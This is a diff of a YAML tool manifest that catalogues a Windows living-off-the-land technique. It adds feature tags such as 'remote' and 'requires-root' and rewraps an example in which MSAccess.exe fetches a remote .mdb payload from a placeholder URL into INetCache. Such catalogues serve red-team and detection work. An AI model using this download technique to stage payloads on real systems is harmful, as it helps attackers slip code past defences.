@@ -2,7 +2,9 @@
 id: windows-download-msaccess
 namespace: windows:download:msaccess
 name: msaccess
-description: 'Microsoft Office component Located at: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSAccess.exe; C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSAccess.exe; C:\Program Files (x86)\Microsoft Office\Office16\MSAccess.exe.'
+description: 'Microsoft Office component Located at: C:\Program Files (x86)\Microsoft
+  Office 16\ClientX86\Root\Office16\MSAccess.exe; C:\Program Files\Microsoft Office
+  16\ClientX64\Root\Office16\MSAccess.exe; C:\Program Files (x86)\Microsoft Office\Office16\MSAccess.exe.'
 author: Nir Chako
 version: 1.0.0
 capabilities:
@@ -41,7 +43,13 @@ resource_profile:
 allowed-tools:
 - msaccess
 parameters: []
-features: []
+features:
+- file-system
+- local
+- network-intensive
+- pipes-stdout
+- remote
+- requires-root
 execution:
   template: msaccess
   sandbox: execFile
@@ -49,7 +57,8 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Downloads payload from remote server (It will download a remote payload (if it has the filename extension .mdb) and place it in INetCache.)
+- description: Downloads payload from remote server (It will download a remote payload
+    (if it has the filename extension .mdb) and place it in INetCache.)
   command: MSAccess.exe {REMOTEURL}
 references: []
 techniques:
@@ -67,7 +76,6 @@ install:
   commands:
   - choco install msaccess
 ---
-
 
 # msaccess
 
